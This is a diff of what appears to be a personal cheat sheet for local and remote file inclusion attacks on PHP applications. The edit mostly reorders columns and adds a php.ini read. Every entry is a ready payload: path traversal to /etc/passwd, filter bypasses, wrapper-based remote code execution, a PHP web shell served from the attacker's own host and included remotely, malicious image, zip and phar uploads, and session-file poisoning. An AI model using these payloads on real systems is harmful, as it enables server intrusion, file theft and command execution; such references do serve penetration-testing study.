@@ -1,33 +1,34 @@
 Local File Inclusion
 Basic LFI 
-1)	/index.php?language=/etc/passwd                                  -      Basic LFI
-2)	/index.php?language=../../../../etc/passwd                       -      LFI with path traversal
-3)	/index.php?language=/../../../etc/passwd                         -      LFI with name prefix
-4)	/index.php?language=./languages/../../../../etc/passwd           -      LFI with approved path
+1)     -      Basic LFI                   -    /index.php?language=/etc/passwd                                 
+2)     -      LFI with path traversal     -    /index.php?language=../../../../etc/passwd                      
+3)	-      LFI with name prefix        -    /index.php?language=/../../../etc/passwd                       
+4)	-      LFI with approved path      -   /index.php?language=./languages/../../../../etc/passwd           
        
 LFI Bypasse
-1)	index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64           -     Bypass filters with URL encoding
-2)	 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048]      -  Bypass appended extension with path truncation (obsolete)
-3)	/index.php?language=../../../../etc/passwd%00                                                   -   Bypass appended extension with null byte (obsolete)
-4)	/index.php?language=php://filter/read=convert.base64-encode/resource=config                     -   Read PHP with base64 filter
+1)	-   Bypass filters with URL encoding                              -     index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64           
+2)	-  Bypass appended extension with path truncation (obsolete)      -     /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048]     
+3)     -   Bypass appended extension with null byte (obsolete)           -    /index.php?language=../../../../etc/passwd%00                                                 
+4)     -   Read PHP with base64 filter                                   -     /index.php?language=php://filter/read=convert.base64-encode/resource=config                    
 
 Remote Code Execution
  PHP Wrappers
-1)	/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id                           - RCE with data wrapper
-2)	 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"       - RCE with input wrapper
-3)	 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"                                                              - RCE with expect wrapper
+1)  Checking PHP Configurations for allow_url_include   - curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"     
+1)	- RCE with data wrapper     -   /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id                           
+2)	- RCE with input wrapper    -   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"       
+3)	- RCE with expect wrapper   -    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"                                                              
 
 RFI
-1)	 echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>                     - Host web shell
-2)	 /index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id                                            - Include remote PHP web shel
+1)	- Host web shell                                    -           echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>                     
+2)	- Include remote PHP web shel                       -          /index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id                                         
  
 LFI + Upload
-1)	 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif                                                            - Create malicious image
-2)	 /index.php?language=./profile_images/shell.gif&cmd=id                                                            - RCE with malicious uploaded image
-3)	 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php                                     - Create malicious zip archive 'as jpg'
-4)	 /index.php?language=zip://shell.zip%23shell.php&cmd=id                                                           - RCE with malicious uploaded zip
-5)	 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg                                                - Create malicious phar 'as jpg'
-6)	 /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id                                         - RCE with malicious uploaded phar
+1)	 - Create malicious image                            -              echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif                                                           
+2)	 - RCE with malicious uploaded image                 -              /index.php?language=./profile_images/shell.gif&cmd=id                                                           
+3)	 - Create malicious zip archive 'as jpg              -              echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php                                    '
+4)      - RCE with malicious uploaded zip                   -              /index.php?language=zip://shell.zip%23shell.php&cmd=id                                                       
+5)	 - Create malicious phar 'as jpg'                    -              php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg                                                
+6)	 - RCE with malicious uploaded phar                  -              /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id                                        
  
  Log Poisoning
 1)	 /index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd                  - Read PHP session parameters
